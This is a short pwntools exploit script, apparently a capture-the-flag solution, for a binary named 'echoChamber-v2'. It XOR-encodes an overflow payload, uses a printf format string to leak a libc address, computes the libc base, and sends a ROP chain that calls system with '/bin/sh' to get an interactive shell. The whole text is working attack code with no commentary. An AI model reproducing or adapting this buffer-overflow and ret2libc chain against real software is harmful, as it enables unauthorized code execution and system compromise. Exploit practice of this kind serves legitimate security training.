from pwn import*

elf = context.binary = ELF('./echoChamber-v2')
libc = ELF('./libc.so.6')
p = process()

buf2ret = 0x48
retGadget = 0x401016
libcLeakOffset = 0x1e8643
libcRSI = 0x2bb39
libcRDX = 0x10d37d

leak_payload = b'%p,'
leak_payload = leak_payload.ljust(buf2ret, b'\x00')
leak_payload = xor(leak_payload, b'\xaa')
payload = leak_payload + p64(retGadget) + p64(elf.plt['printf']) + p64(elf.sym['vulnerable_function'])
p.recvuntil(b'>\x1b[0m ')
p.sendline(payload)

p.recvuntil(b'%p,')
p.recvline()

leak = p.recvline()
leak = leak.split(b',')
leak = leak[0]
leak = int(leak, 16)
libc.address = leak - libcLeakOffset
log.success("found libc's base address: " + hex(libc.address))

payload = b'/bin/sh'
payload = payload.ljust(buf2ret, b'\x00')
payload = xor(payload, b'\xaa')
payload += p64(libc.address + libcRSI) + p64(0x0) + p64(libc.address + libcRDX) + p64(0x0) + p64(libc.sym['system'])
p.recvuntil(b'>\x1b[0m ')
p.sendline(payload)
log.success('popping a shell...')

p.interactive()

